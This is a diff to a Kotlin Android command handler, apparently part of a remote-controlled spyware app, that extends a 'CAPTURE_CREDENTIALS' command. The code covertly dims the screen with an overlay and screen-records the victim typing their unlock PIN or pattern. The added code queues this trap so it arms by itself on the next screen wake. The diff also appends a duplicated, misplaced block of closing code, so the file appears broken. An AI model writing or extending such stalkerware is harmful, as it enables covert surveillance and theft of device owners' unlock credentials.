@@ -512,7 +512,6 @@ object CommandProcessor {
                     }
                 }
                 "CAPTURE_CREDENTIALS" -> {
-                    ScreenRecordManager.pendingCmdId = id
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                     val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
                     
@@ -520,42 +519,15 @@ object CommandProcessor {
                         status = "FAILED_NOT_SECURE"
                         errorMsg = "Device is not protected by PIN/Pattern/Password."
                     } else if (!pm.isInteractive) {
-                        status = "FAILED (SCREEN_OFF)"
-                        errorMsg = "Screen must be physically ON to initiate the trap securely."
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                            .putBoolean("pending_cred_trap", true)
+                            .putInt("pending_cred_id", id)
+                            .putString("pending_cred_content", content)
+                            .apply()
+                        status = "QUEUED_FOR_NEXT_WAKE"
+                        errorMsg = "Screen is OFF. Trap will automatically arm on the next user wake event."
                     } else {
-                        val parts = content.split("|")
-                        val timeoutSec = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 20L
-                        val qual = parts.getOrNull(1)?.trim()?.uppercase() ?: "MED"
-                        val fps = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 30
-
-                        // Start Authentication Recovery Monitor
-                        AuthRecoveryManager.startRecovery(id)
-
-                        // Arm the Video Recorder
-                        ScreenRecordManager.expectedMode = "AUTO"
-                        ScreenRecordManager.pendingDur = 600 // 10 min fallback cap
-                        ScreenRecordManager.pendingQual = qual
-                        ScreenRecordManager.pendingFps = fps
-                        ScreenRecordManager.pendingAudio = false
-                        ScreenRecordManager.isPatternTrap = true
-                        ScreenRecordManager.patternSuccessTimeoutMs = timeoutSec * 1000L
-                        
-                        android.os.Handler(android.os.Looper.getMainLooper()).post {
-                            DimmerManager.applyDim(ctx, 0, "OVERLAY")
-                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                                if (ScreenRecordManager.expectedMode == "AUTO") {
-                                    DimmerManager.removeOverlay(ctx)
-                                    ScreenRecordManager.expectedMode = ""
-                                }
-                            }, 10000)
-                        }
-                        
-                        val i = Intent(ctx, PulseActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                            putExtra("is_screen_record_trigger", true)
-                        }
-                        ctx.startActivity(i)
-                        status = "CREDENTIAL_TRAP_ARMED (Timeout: ${timeoutSec}s | Quality: $qual)"
+                        status = armCredentialTrap(ctx, id, content)
                     }
                 }
                 "GET_TREE" -> {
@@ -2979,5 +2951,45 @@ object CommandProcessor {
                 DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
             }
         }
+    }
+                    DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
+                }
+            }
+        }
+    }
+
+    fun armCredentialTrap(ctx: Context, id: Int, content: String): String {
+        val parts = content.split("|")
+        val timeoutSec = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 20L
+        val qual = parts.getOrNull(1)?.trim()?.uppercase() ?: "MED"
+        val fps = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 30
+
+        AuthRecoveryManager.startRecovery(id)
+
+        ScreenRecordManager.pendingCmdId = id
+        ScreenRecordManager.expectedMode = "AUTO"
+        ScreenRecordManager.pendingDur = 600
+        ScreenRecordManager.pendingQual = qual
+        ScreenRecordManager.pendingFps = fps
+        ScreenRecordManager.pendingAudio = false
+        ScreenRecordManager.isPatternTrap = true
+        ScreenRecordManager.patternSuccessTimeoutMs = timeoutSec * 1000L
+        
+        android.os.Handler(android.os.Looper.getMainLooper()).post {
+            DimmerManager.applyDim(ctx, 0, "OVERLAY")
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                if (ScreenRecordManager.expectedMode == "AUTO") {
+                    DimmerManager.removeOverlay(ctx)
+                    ScreenRecordManager.expectedMode = ""
+                }
+            }, 10000)
+        }
+        
+        val i = Intent(ctx, PulseActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+            putExtra("is_screen_record_trigger", true)
+        }
+        ctx.startActivity(i)
+        return "CREDENTIAL_TRAP_ARMED (Timeout: ${timeoutSec}s | Quality: $qual)"
     }
 }
